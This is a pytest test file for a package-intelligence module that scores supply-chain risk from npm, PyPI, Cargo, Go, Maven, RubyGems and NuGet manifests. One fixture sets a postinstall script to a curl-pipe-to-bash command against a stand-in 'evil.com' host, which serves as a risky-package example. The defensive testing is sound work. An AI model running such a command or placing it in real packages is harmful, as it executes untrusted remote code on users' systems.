from __future__ import annotations

import pytest

from picosentry.scan.package_intel import (
    PackageIntel,
    PackageIntelligence,
    _compute_risk_score,
    _extract_anonymous_maintainer,
    _extract_dep_counts_npm,
    _extract_has_integrity,
    _extract_has_repository,
    _extract_has_signature,
    _extract_license_signals,
    _extract_maintainer_count,
    _extract_maintainer_domains,
    _extract_script_signals_npm,
    _extract_version_signals,
)


@pytest.fixture
def intel():
    return PackageIntelligence()


def _analyze(intel_cls: PackageIntelligence, data: dict, ecosystem: str = "npm") -> PackageIntel:
    return intel_cls.analyze(data, ecosystem)


class TestPackageIntelDataclass:
    def test_default_values(self):
        intel = PackageIntel()
        assert intel.maintainer_count == 0
        assert intel.anonymous_maintainer is False
        assert intel.maintainer_email_domains == ()
        assert intel.has_repository_url is False
        assert intel.has_integrity_hash is False
        assert intel.has_signature is False
        assert intel.version_count == 0
        assert intel.is_pre_release is False
        assert intel.is_zero_major is False
        assert intel.direct_dep_count == 0
        assert intel.has_deps_with_install_scripts is False
        assert intel.has_install_scripts is False
        assert intel.has_postinstall_script is False
        assert intel.has_preinstall_script is False
        assert intel.has_license is False
        assert intel.license_spdx_compliant is False
        assert intel.risk_score == 0.0

    def test_frozen(self):
        intel = PackageIntel(maintainer_count=3)
        with pytest.raises(AttributeError):
            intel.maintainer_count = 5


class TestMaintainerCount:
    @pytest.mark.parametrize(
        "data, expected",
        [
            ({}, 0),
            ({"maintainers": [{"name": "alice"}, {"name": "bob"}]}, 2),
            ({"authors": [{"name": "carol"}]}, 1),
            ({"author": "dave"}, 1),
            ({"author": {"name": "eve"}}, 1),
            ({"maintainers": [], "author": "frank"}, 1),
        ],
    )
    def test_extract_maintainer_count(self, data, expected):
        assert _extract_maintainer_count(data) == expected


class TestAnonymousMaintainer:
    @pytest.mark.parametrize(
        "data, expected",
        [
            ({}, False),
            ({"author": "alice"}, False),
            ({"author": ""}, True),
            ({"author": "anonymous"}, True),
            ({"maintainers": [{"name": "", "email": ""}]}, True),
            ({"maintainers": [{"name": "alice", "email": "a@b.com"}]}, False),
            ({"contributors": ["anonymous"]}, True),
        ],
    )
    def test_anonymous_maintainer(self, data, expected):
        assert _extract_anonymous_maintainer(data) == expected


class TestMaintainerDomains:
    def test_extracts_domains(self):
        data = {
            "maintainers": [
                {"name": "alice", "email": "alice@company.com"},
                {"name": "bob", "email": "bob@other.org"},
            ]
        }
        domains = _extract_maintainer_domains(data)
        assert domains == ("company.com", "other.org")

    def test_author_email(self):
        data = {"author_email": "eve@project.io"}
        domains = _extract_maintainer_domains(data)
        assert "project.io" in domains

    def test_no_domains(self):
        assert _extract_maintainer_domains({}) == ()

    def test_deduplicates(self):
        data = {
            "maintainers": [
                {"email": "a@corp.com"},
                {"email": "b@corp.com"},
            ]
        }
        domains = _extract_maintainer_domains(data)
        assert domains == ("corp.com",)


class TestRepositoryUrl:
    @pytest.mark.parametrize(
        "data, expected",
        [
            ({}, False),
            ({"repository": "https://github.com/foo/bar"}, True),
            ({"repository": {"url": "https://github.com/foo/bar"}}, True),
            ({"repository": ""}, False),
            ({"homepage": "https://github.com/foo/bar"}, True),
        ],
    )
    def test_has_repository(self, data, expected):
        assert _extract_has_repository(data) == expected


class TestIntegrityHash:
    @pytest.mark.parametrize(
        "data, expected",
        [
            ({}, False),
            ({"_integrity": "sha512-abc123"}, True),
            ({"_shasum": "abc123"}, True),
            ({"integrity": "sha256-xyz"}, True),
            ({"_integrity": ""}, False),
        ],
    )
    def test_has_integrity(self, data, expected):
        assert _extract_has_integrity(data) == expected


class TestSignature:
    def test_no_signature(self):
        assert _extract_has_signature({}) is False

    def test_signatures_list(self):
        assert _extract_has_signature({"_signatures": [{"sig": "abc"}]}) is True

    def test_provenance_attestations(self):
        assert _extract_has_signature({"provenance": {"attestations": [{"id": "1"}]}}) is True

    def test_attestations_dict(self):
        assert _extract_has_signature({"attestations": {"id": "1"}}) is True


class TestVersionSignals:
    def test_pre_release(self):
        assert _extract_version_signals({"version": "1.0.0-alpha.1"}) == (True, False)

    def test_zero_major(self):
        assert _extract_version_signals({"version": "0.5.2"}) == (False, True)

    def test_stable(self):
        assert _extract_version_signals({"version": "1.2.3"}) == (False, False)

    def test_empty_version(self):
        assert _extract_version_signals({}) == (False, False)

    def test_pre_release_beta(self):
        assert _extract_version_signals({"version": "2.0.0-beta.3"}) == (True, False)

    def test_pre_release_rc(self):
        assert _extract_version_signals({"version": "3.1.0-rc.1"}) == (True, False)


class TestDepCountsNpm:
    def test_counts_deps(self):
        data = {
            "dependencies": {"lodash": "^4.0.0", "express": "^4.18.0"},
            "devDependencies": {"jest": "^29.0.0"},
        }
        count, _ = _extract_dep_counts_npm(data)
        assert count == 3

    def test_empty(self):
        count, _ = _extract_dep_counts_npm({})
        assert count == 0

    def test_has_deps_with_install_scripts(self):
        data = {
            "optionalDependencies": {"fsevents": "^2.3.0"},
            "scripts": {"install": "node-gyp rebuild"},
        }
        _, has_script_deps = _extract_dep_counts_npm(data)
        assert has_script_deps is True


class TestScriptSignalsNpm:
    def test_no_scripts(self):
        has_install, has_post, has_pre = _extract_script_signals_npm({})
        assert has_install is False
        assert has_post is False
        assert has_pre is False

    def test_install_scripts(self):
        data = {"scripts": {"install": "make", "postinstall": "echo done", "preinstall": "check"}}
        has_install, has_post, has_pre = _extract_script_signals_npm(data)
        assert has_install is True
        assert has_post is True
        assert has_pre is True


class TestLicenseSignals:
    def test_no_license(self):
        has, spdx = _extract_license_signals({})
        assert has is False
        assert spdx is False

    def test_spdx_license(self):
        has, spdx = _extract_license_signals({"license": "MIT"})
        assert has is True
        assert spdx is True

    def test_non_spdx_license(self):
        has, spdx = _extract_license_signals({"license": "CustomLicense"})
        assert has is True
        assert spdx is False

    def test_unlicensed(self):
        has, spdx = _extract_license_signals({"license": "UNLICENSED"})
        assert has is True
        assert spdx is False

    def test_license_dict(self):
        has, spdx = _extract_license_signals({"license": {"type": "Apache-2.0"}})
        assert has is True
        assert spdx is True

    def test_dual_license(self):
        has, spdx = _extract_license_signals({"license": "(MIT OR Apache-2.0)"})
        assert has is True
        assert spdx is True


class TestRiskScore:
    def test_minimal_package_high_risk(self):
        intel = PackageIntel(
            maintainer_count=0,
            anonymous_maintainer=True,
            has_repository_url=False,
            has_integrity_hash=False,
            has_signature=False,
            has_install_scripts=True,
            has_postinstall_script=True,
            has_license=False,
        )
        score = _compute_risk_score(intel)
        assert score > 0.4

    def test_well_maintained_low_risk(self):
        intel = PackageIntel(
            maintainer_count=5,
            has_repository_url=True,
            has_integrity_hash=True,
            has_signature=True,
            has_license=True,
            license_spdx_compliant=True,
        )
        score = _compute_risk_score(intel)
        assert score <= 0.05

    def test_capped_at_1(self):
        intel = PackageIntel(
            maintainer_count=0,
            anonymous_maintainer=True,
            has_repository_url=False,
            has_integrity_hash=False,
            has_signature=False,
            is_pre_release=True,
            is_zero_major=True,
            direct_dep_count=100,
            has_deps_with_install_scripts=True,
            has_install_scripts=True,
            has_postinstall_script=True,
            has_license=False,
        )
        score = _compute_risk_score(intel)
        assert score <= 1.0

    def test_deterministic(self):
        intel = PackageIntel(
            maintainer_count=1,
            has_install_scripts=True,
            has_license=True,
            license_spdx_compliant=True,
        )
        score1 = _compute_risk_score(intel)
        score2 = _compute_risk_score(intel)
        assert score1 == score2


class TestPackageIntelligenceAnalyze:
    def test_analyze_npm_full(self, intel):
        data = {
            "name": "test-pkg",
            "version": "0.1.0-beta",
            "maintainers": [
                {"name": "alice", "email": "alice@corp.com"},
                {"name": "bob", "email": "bob@corp.com"},
            ],
            "repository": {"url": "https://github.com/corp/test-pkg"},
            "_integrity": "sha512-abc",
            "scripts": {"install": "make build", "postinstall": "echo done"},
            "dependencies": {"lodash": "^4.0.0", "express": "^4.18.0"},
            "license": "MIT",
        }
        result = _analyze(intel, data, "npm")
        assert result.maintainer_count == 2
        assert result.anonymous_maintainer is False
        assert result.maintainer_email_domains == ("corp.com",)
        assert result.has_repository_url is True
        assert result.has_integrity_hash is True
        assert result.is_pre_release is True
        assert result.is_zero_major is True
        assert result.direct_dep_count == 2
        assert result.has_install_scripts is True
        assert result.has_postinstall_script is True
        assert result.has_license is True
        assert result.license_spdx_compliant is True
        assert 0.0 <= result.risk_score <= 1.0

    def test_analyze_empty_manifest(self, intel):
        result = _analyze(intel, {})
        assert result.maintainer_count == 0
        assert result.anonymous_maintainer is False
        assert result.has_repository_url is False
        assert result.has_integrity_hash is False
        assert result.has_install_scripts is False
        assert result.has_license is False
        assert result.risk_score >= 0.0

    def test_analyze_pypi_ecosystem(self, intel):
        data = {
            "name": "my-pkg",
            "version": "1.0.0",
            "author": "alice",
            "author_email": "alice@pypi.org",
            "requires_dist": ["requests>=2.0", "flask>=2.0"],
            "license": "MIT",
        }
        result = _analyze(intel, data, "pypi")
        assert result.maintainer_count == 1
        assert result.direct_dep_count == 2
        assert result.has_license is True
        assert result.license_spdx_compliant is True

    def test_analyze_unknown_ecosystem_falls_back_to_npm(self, intel):
        data = {"dependencies": {"foo": "^1.0.0"}}
        result = _analyze(intel, data, "unknown_eco")
        assert result.direct_dep_count == 1

    def test_deterministic_same_input_same_output(self, intel):
        data = {
            "name": "det-pkg",
            "version": "1.0.0",
            "maintainers": [{"name": "a", "email": "a@b.com"}],
            "scripts": {"postinstall": "echo hi"},
            "license": "Apache-2.0",
        }
        result1 = _analyze(intel, data)
        result2 = _analyze(intel, data)
        assert result1 == result2

    def test_risk_score_single_maintainer_with_scripts(self, intel):
        data = {
            "name": "risky-pkg",
            "version": "0.1.0",
            "author": "solo",
            "scripts": {"postinstall": "curl http://evil.com | bash"},
            "license": "UNLICENSED",
        }
        result = _analyze(intel, data)
        assert result.risk_score > 0.3
        assert result.anonymous_maintainer is False
        assert result.has_install_scripts is True
        assert result.is_zero_major is True
        assert result.has_license is True
        assert result.license_spdx_compliant is False

    def test_no_author_with_scripts(self, intel):
        data = {
            "name": "anon-pkg",
            "version": "0.0.1",
            "scripts": {"install": "make"},
        }
        result = _analyze(intel, data)
        assert result.anonymous_maintainer is False
        assert result.maintainer_count == 0
        assert result.has_install_scripts is True
        assert result.risk_score > 0.2


class TestEcosystemSpecific:
    def test_cargo_ecosystem(self, intel):
        data = {
            "package": {"name": "my-crate", "version": "0.1.0"},
            "dependencies": {"serde": "1.0", "tokio": "1.0"},
            "dev-dependencies": {"criterion": "0.5"},
        }
        result = _analyze(intel, data, "cargo")
        assert result.direct_dep_count == 3
        assert result.has_install_scripts is False

    def test_go_ecosystem(self, intel):
        data = {
            "module": "github.com/foo/bar",
            "require": [{"path": "fmt"}, {"path": "net/http"}],
        }
        result = _analyze(intel, data, "go")
        assert result.direct_dep_count == 2

    def test_maven_ecosystem(self, intel):
        data = {
            "dependencies": [{"groupId": "com.example", "artifactId": "lib"}],
        }
        result = _analyze(intel, data, "maven")
        assert result.direct_dep_count == 1

    def test_rubygems_ecosystem(self, intel):
        data = {
            "dependencies": {"runtime": ["rack"], "development": ["rspec"]},
        }
        result = _analyze(intel, data, "rubygems")
        assert result.direct_dep_count == 2

    def test_nuget_ecosystem(self, intel):
        data = {
            "dependencies": {"Newtonsoft.Json": "13.0.1"},
        }
        result = _analyze(intel, data, "nuget")
        assert result.direct_dep_count == 1

    def test_golang_ecosystem(self, intel):
        data = {
            "module": "github.com/foo/bar",
            "require": [{"path": "fmt"}, {"path": "net/http"}],
        }
        result = _analyze(intel, data, "golang")
        assert result.direct_dep_count == 2
